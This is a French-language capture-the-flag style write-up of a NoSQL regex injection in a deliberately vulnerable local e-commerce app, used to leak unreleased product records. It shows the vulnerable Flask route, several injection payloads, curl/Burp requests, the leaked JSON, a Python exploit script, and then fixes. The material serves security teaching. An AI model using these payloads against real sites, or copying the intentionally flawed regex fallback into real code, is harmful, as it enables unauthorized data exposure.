# 🔍 Writeup - NoSQL Injection: Leak Unreleased Products

## **1. Reconnaissance et Analyse**

**Cible :** TargetCorp Store - Application e-commerce  
**URL :** http://localhost:3206  
**Vulnérabilité :** NoSQL Injection dans le paramètre `category`  
**Objectif :** Exposer les détails de produits non publiés

### **1.1 Exploration de l'Application**

L'application présente une interface e-commerce avec :
- Page d'accueil (`/`)
- Catalogue de produits (`/products`) 
- Portail d'administration (`/admin`)
- API de produits (`/api/products`)

### **1.2 Analyse du Code Source**

En examinant le code de l'application dans `build/app.py`, on découvre la vulnérabilité :

```python
@app.route('/api/products')
def api_products():
    category = request.args.get('category', '')
    
    if category:
        # Check if this is a normal category filter (not an injection attempt)
        normal_categories = ["Electronics", "Home", "Clothing"]
        
        if category in normal_categories:
            # Normal filter - only show public products
            query = {
                "$and": [
                    {"category": category},
                    {"status": "public"}
                ]
            }
        else:
            # Potential injection - use regex which can be exploited
            query = {"category": {"$regex": category}}
    else:
        query = {"status": "public"}
```

**Problème :** Le paramètre `category` peut être injecté avec des expressions régulières MongoDB via l'opérateur `$regex`, permettant de contourner les filtres de sécurité.

## **2. Découverte de la Vulnérabilité**

### **2.1 Test de Fonctionnement Normal**

```bash
# Requête normale
curl "http://localhost:3206/api/products?category=Electronics"
```

**Résultat :** Retourne seulement les produits Electronics avec status "public" (2 produits)

### **2.2 Détection de l'Injection**

L'application utilise une logique conditionnelle :
- **Filtres normaux** (`Electronics`, `Home`, `Clothing`) : Affichent seulement les produits publics
- **Valeurs non normales** : Utilisent l'opérateur `$regex` qui peut être injecté

## **3. Exploitation de la Vulnérabilité**

### **3.1 Payloads d'Injection**

**Payload 1 : Contournement complet**
```bash
curl "http://localhost:3206/api/products?category=.*"
```

**Payload 2 : Sélection multiple**
```bash
curl "http://localhost:3206/api/products?category=Electronics|Home|Clothing"
```

**Payload 3 : Pattern matching avancé**
```bash
curl "http://localhost:3206/api/products?category=Electronics.*"
```

### **3.2 Résultats de l'Exploitation**

L'injection avec `.*` retourne **TOUS** les produits, y compris ceux avec `status: "unreleased"` :

```json
[
  {
    "name": "Next-Gen Gaming Console",
    "sku": "GC-2025-001", 
    "category": "Electronics",
    "price": 599.99,
    "description": "Revolutionary gaming console with AI-powered graphics",
    "status": "unreleased",
    "release_date": "2025-06-15"
  },
  {
    "name": "Quantum Smartphone",
    "sku": "QS-2025-002",
    "category": "Electronics", 
    "price": 1299.99,
    "description": "First quantum-encrypted smartphone with holographic display",
    "status": "unreleased",
    "release_date": "2025-08-20"
  },
  {
    "name": "Smart Home Security System",
    "sku": "SH-2025-003",
    "category": "Home",
    "price": 399.99,
    "description": "AI-powered home security with facial recognition", 
    "status": "unreleased",
    "release_date": "2025-07-10"
  },
  {
    "name": "Sustainable Fashion Collection",
    "sku": "SF-2025-004",
    "category": "Clothing",
    "price": 89.99,
    "description": "Eco-friendly fashion line made from recycled materials",
    "status": "unreleased",
    "release_date": "2025-09-01"
  }
]
```

## **4. Analyse de l'Impact**

### **4.1 Données Exposées**
- **Noms des produits non publiés**
- **SKUs sensibles** (GC-2025-001, QS-2025-002, etc.)
- **Prix et descriptions détaillées**
- **Dates de sortie prévues**

### **4.2 Risques Business**
- **Concurrence déloyale** : Les concurrents peuvent découvrir les futurs produits
- **Perte d'avantage concurrentiel** : Les stratégies de lancement sont compromises
- **Violation de confidentialité** : Informations propriétaires exposées

## **5. Méthodes d'Exploitation**

### **5.1 Via Interface Web**
1. Aller sur `/products`
2. Utiliser le champ "Custom Category Filter"
3. Entrer `.*` et cliquer sur "Filter"

### **5.2 Via API Directe**
```bash
# Avec curl
curl "http://localhost:3206/api/products?category=.*"

# Avec Burp Suite
GET /api/products?category=.* HTTP/1.1
Host: localhost:3206
```

### **5.3 Script d'Exploitation Automatisé**
```python
import requests
import urllib.parse

def exploit_nosql_injection():
    base_url = "http://localhost:3206/api/products"
    payload = ".*"
    encoded_payload = urllib.parse.quote(payload)
    
    response = requests.get(f"{base_url}?category={encoded_payload}")
    products = response.json()
    
    unreleased_products = [p for p in products if p.get('status') == 'unreleased']
    
    print("=== PRODUITS NON PUBLIÉS EXPOSÉS ===")
    for product in unreleased_products:
        print(f"Nom: {product['name']}")
        print(f"SKU: {product['sku']}")
        print(f"Prix: ${product['price']}")
        print(f"Date de sortie: {product.get('release_date')}")
        print("---")

exploit_nosql_injection()
```

## **6. Contre-mesures et Prévention**

### **6.1 Validation des Entrées**
```python
import re

def validate_category(category):
    # Autoriser seulement les caractères alphanumériques et espaces
    if not re.match(r'^[a-zA-Z0-9\s]+$', category):
        raise ValueError("Invalid category")
    return category
```

### **6.2 Utilisation de Paramètres Préparés**
```python
# Au lieu de injection directe
query = {"category": category}

# Utiliser des requêtes préparées MongoDB
query = {"category": {"$in": ["Electronics", "Home", "Clothing"]}}
```

### **6.3 Échappement des Caractères Spéciaux**
```python
import re

def escape_regex_chars(category):
    # Échapper les caractères spéciaux regex
    return re.escape(category)
```

### **6.4 Correction de la Vulnérabilité**
```python
@app.route('/api/products')
def api_products():
    try:
        db = get_db()
        category = request.args.get('category', '')
        
        # CORRECTION : Validation et échappement
        if category:
            # Valider l'entrée
            if not re.match(r'^[a-zA-Z0-9\s]+$', category):
                return jsonify({"error": "Invalid category"}), 400
            
            # Utiliser une liste de catégories autorisées
            allowed_categories = ["Electronics", "Home", "Clothing"]
            if category not in allowed_categories:
                return jsonify({"error": "Category not found"}), 404
                
            query = {"category": category}
        else:
            query = {"status": "public"}
        
        products = list(db.products.find(query))
        
        for product in products:
            if '_id' in product:
                product['_id'] = str(product['_id'])
        
        return jsonify(products)
    
    except Exception as e:
        return jsonify({"error": str(e)}), 500
```

## **7. Flag et Validation**

**Element to proof :** Détails des produits non publiés  
**Final flag info :** Fuite des détails de produits non publiés, tels que noms et SKUs

**Produits exposés :**
- Next-Gen Gaming Console (SKU: GC-2025-001)
- Quantum Smartphone (SKU: QS-2025-002)  
- Smart Home Security System (SKU: SH-2025-003)
- Sustainable Fashion Collection (SKU: SF-2025-004)

## **8. Étapes de Résolution Complètes**

### **Étape 1 : Reconnaissance**
1. Explorer l'application web
2. Identifier les endpoints vulnérables
3. Analyser le code source

### **Étape 2 : Détection**
1. Tester le paramètre `category` avec des valeurs normales
2. Observer que les filtres normaux ne montrent que les produits publics
3. Identifier que les valeurs non normales utilisent `$regex`

### **Étape 3 : Exploitation**
1. Tester différents payloads regex
2. Utiliser `.*` pour contourner le filtre
3. Extraire les données sensibles

### **Étape 4 : Validation**
1. Confirmer l'accès aux produits non publiés
2. Documenter les informations exposées
3. Évaluer l'impact business

## **9. Conclusion**

Cette vulnérabilité NoSQL injection démontre l'importance de :
- **Valider toutes les entrées utilisateur**
- **Utiliser des requêtes préparées**
- **Éviter l'injection directe de paramètres dans les requêtes**
- **Implémenter une validation côté serveur robuste**

L'exploitation réussie permet d'accéder à des informations sensibles qui ne devraient être accessibles qu'aux administrateurs, compromettant la confidentialité des stratégies business de l'entreprise.

### **Compétences Apprises**
- Détection et confirmation d'injections NoSQL
- Construction et encodage de payloads MongoDB
- Exploitation d'injections pour accéder à des données non autorisées
- Évaluation de l'impact business des vulnérabilités 